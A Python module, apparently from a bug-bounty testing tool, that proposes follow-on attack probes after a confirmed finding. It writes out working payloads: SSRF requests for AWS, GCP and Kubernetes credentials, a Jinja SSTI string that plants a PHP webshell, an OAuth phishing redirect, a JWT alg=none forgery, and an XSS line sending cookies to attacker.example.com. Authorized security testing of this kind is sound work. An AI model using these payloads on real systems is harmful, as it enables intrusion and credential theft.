"""Chain proposal engine.

Builds on top of the existing
:mod:`src.intelligence.correlation.attack_chain_correlator` and the
``AttackChainVisualizer`` to *propose* follow-on probes when a
finding is confirmed. The correlation engine already builds attack
graphs from existing findings; this module adds the "what should I
try next?" layer.

Each proposal is a small, self-contained step with:
* a target URL pattern,
* a probe description,
* a confidence score (0.0-1.0),
* an expected finding type if the probe succeeds.

The engine is deliberately conservative: it only proposes steps
for chains that have been observed in published bug-bounty reports,
to avoid false positives. Operators can disable individual chains
via the ``chain_proposals`` config block.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass(slots=True)
class ChainProposal:
    """A suggested follow-on probe."""

    label: str
    description: str
    target_hint: str
    probe: str
    expected_finding: str
    confidence: float = 0.5
    references: tuple[str, ...] = ()


@dataclass(slots=True)
class FindingShape:
    """The minimum signal the engine needs from a finding.

    The shape mirrors the fields the engine inspects. New chains
    should be added in :meth:`ChainProposalEngine.propose_for`.
    """

    category: str
    severity: str
    url: str
    target: str
    evidence: dict[str, Any] = field(default_factory=dict)


class ChainProposalEngine:
    """Propose follow-on probes for a confirmed finding.

    Usage::

        engine = ChainProposalEngine()
        proposals = engine.propose_for(finding_shape)
        for p in proposals:
            print(p.label, p.confidence, p.probe)
    """

    def __init__(self, *, min_confidence: float = 0.3) -> None:
        self.min_confidence = min_confidence
        # Each chain is a function ``(FindingShape) -> ChainProposal | None``.
        # Custom chains can be registered at runtime via :meth:`register`.
        self._chains: list[Any] = [
            self._chain_ssrf_to_aws,
            self._chain_ssrf_to_gcp,
            self._chain_ssrf_to_k8s,
            self._chain_ssti_to_rce,
            self._chain_idor_to_takeover,
            self._chain_open_redirect_to_token_theft,
            self._chain_jwt_alg_none,
            self._chain_xss_to_session_hijack,
        ]

    def register(self, chain: Any) -> None:
        """Register a custom chain function. The function takes a
        :class:`FindingShape` and returns either a :class:`ChainProposal`
        or ``None`` to indicate the chain doesn't apply.
        """
        self._chains.append(chain)

    def propose_for(self, finding: FindingShape) -> list[ChainProposal]:
        """Return all chain proposals for ``finding``, sorted by confidence."""
        out: list[ChainProposal] = []
        for chain in self._chains:
            try:
                proposal = chain(finding)
            except Exception as exc:  # noqa: BLE001
                logger.debug("chain %s raised: %s", getattr(chain, "__name__", chain), exc)
                continue
            if proposal is None:
                continue
            if proposal.confidence < self.min_confidence:
                continue
            out.append(proposal)
        out.sort(key=lambda p: p.confidence, reverse=True)
        return out

    # ------------------------------------------------------------------
    # Built-in chains
    # ------------------------------------------------------------------

    @staticmethod
    def _chain_ssrf_to_aws(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"ssrf", "server_side_request_forgery"}:
            return None
        if "169.254.169.254" in (f.evidence.get("probe") or ""):
            return None  # already probed metadata
        return ChainProposal(
            label="SSRF → AWS metadata",
            description=(
                "SSRF detected — probe the AWS instance metadata "
                "endpoint (169.254.169.254) and the IMDSv2 token API. "
                "If reachable, the host is on EC2 and may leak IAM "
                "credentials."
            ),
            target_hint="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            probe=(
                "GET {target}/latest/api/token HTTP/1.1\\r\\n"
                "X-aws-ec2-metadata-token-ttl-seconds: 21600\\r\\n\\r\\n"
            ),
            expected_finding="ssrf-aws-metadata",
            confidence=0.85,
            references=(
                "https://hackerone.com/reports/229026",
                "https://aws.amazon.com/blogs/security/defense-in-depth-using-fwctl/",
            ),
        )

    @staticmethod
    def _chain_ssrf_to_gcp(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"ssrf", "server_side_request_forgery"}:
            return None
        return ChainProposal(
            label="SSRF → GCP metadata",
            description=(
                "SSRF detected — probe the GCP metadata endpoint "
                "(metadata.google.internal) and the v1beta1 "
                "service-accounts endpoint. The presence of an "
                "access token in the response is a critical finding."
            ),
            target_hint="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            probe=(
                "GET {target} HTTP/1.1\\r\\n"
                "Metadata-Flavor: Google\\r\\n\\r\\n"
            ),
            expected_finding="ssrf-gcp-metadata",
            confidence=0.75,
        )

    @staticmethod
    def _chain_ssrf_to_k8s(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"ssrf", "server_side_request_forgery"}:
            return None
        return ChainProposal(
            label="SSRF → Kubernetes API",
            description=(
                "Probe the Kubernetes API server (kubernetes.default.svc) "
                "and the kubelet read-only port (10255). If the "
                "service-account token is mounted in the pod it is "
                "trivially exfiltrated."
            ),
            target_hint="https://kubernetes.default.svc/api/v1/namespaces",
            probe="GET {target} HTTP/1.1\\r\\nHost: kubernetes.default.svc\\r\\n\\r\\n",
            expected_finding="ssrf-k8s-api",
            confidence=0.7,
        )

    @staticmethod
    def _chain_ssti_to_rce(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"ssti", "template_injection", "server_side_template_injection"}:
            return None
        if "writable" in (f.evidence.get("context") or "").lower():
            return None
        return ChainProposal(
            label="SSTI → RCE via cron / file write",
            description=(
                "SSTI confirmed — attempt a Jinja/Twig/FreeMarker "
                "expression that writes a webshell or a cronjob. "
                "Targets: PHP webshell under /var/www, crontab line "
                "for the application user."
            ),
            target_hint=f.url,
            probe=(
                "POST {target} with body containing "
                "'{{ self.__init__.__globals__.__builtins__.open(\"//var//www//shell.php\",\"w\").write(\"<?php system($_GET[c]); ?>\") }}'"
            ),
            expected_finding="rce-webshell",
            confidence=0.6,
        )

    @staticmethod
    def _chain_idor_to_takeover(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"idor", "bola", "broken_object_level_authorization"}:
            return None
        return ChainProposal(
            label="IDOR → Account takeover",
            description=(
                "IDOR exposes PII / role — chain it with a password "
                "reset flow that uses predictable tokens, or attempt "
                "an email-change flow with the IDOR'd user_id."
            ),
            target_hint=f.url,
            probe=(
                "POST {target}/password-reset with the IDOR'd user_id; "
                "observe the reset token in the response / mailbox."
            ),
            expected_finding="account-takeover",
            confidence=0.5,
        )

    @staticmethod
    def _chain_open_redirect_to_token_theft(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"open_redirect", "unvalidated_redirect"}:
            return None
        return ChainProposal(
            label="Open redirect → OAuth token theft",
            description=(
                "Open redirect present — craft a phishing link that "
                "starts an OAuth flow with a redirect_uri pointing "
                "to the open redirect. The victim's authorization "
                "code lands on the attacker's server."
            ),
            target_hint=f.url,
            probe=(
                "GET {target}/oauth/authorize?response_type=code"
                "&client_id=victim&redirect_uri={your_open_redirect_url}"
            ),
            expected_finding="oauth-token-theft",
            confidence=0.55,
        )

    @staticmethod
    def _chain_jwt_alg_none(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"jwt", "json_web_token"}:
            return None
        return ChainProposal(
            label="JWT alg=none acceptance",
            description=(
                "JWT validation observed — resubmit the token with "
                "the algorithm set to 'none' and the signature "
                "stripped. If accepted, the endpoint is vulnerable "
                "to alg-confusion."
            ),
            target_hint=f.url,
            probe=(
                "POST {target} with the JWT header swapped to "
                "'alg: none' and an empty signature."
            ),
            expected_finding="jwt-alg-none",
            confidence=0.65,
        )

    @staticmethod
    def _chain_xss_to_session_hijack(f: FindingShape) -> ChainProposal | None:
        if f.category.lower() not in {"xss", "cross_site_scripting"}:
            return None
        return ChainProposal(
            label="Stored XSS → Session hijack",
            description=(
                "Stored XSS confirmed — inject a payload that exfiltrates "
                "document.cookie + the localStorage JWT to a Burp "
                "Collaborator-style endpoint. If the session cookie is "
                "not HttpOnly, the chain is complete."
            ),
            target_hint=f.url,
            probe=(
                "POST {target} with body "
                "'<img src=x onerror=\"fetch(\\\"//attacker.example.com/?c=\\\"+document.cookie)\">'"
            ),
            expected_finding="session-hijack",
            confidence=0.5,
        )


__all__ = [
    "ChainProposal",
    "ChainProposalEngine",
    "FindingShape",
]
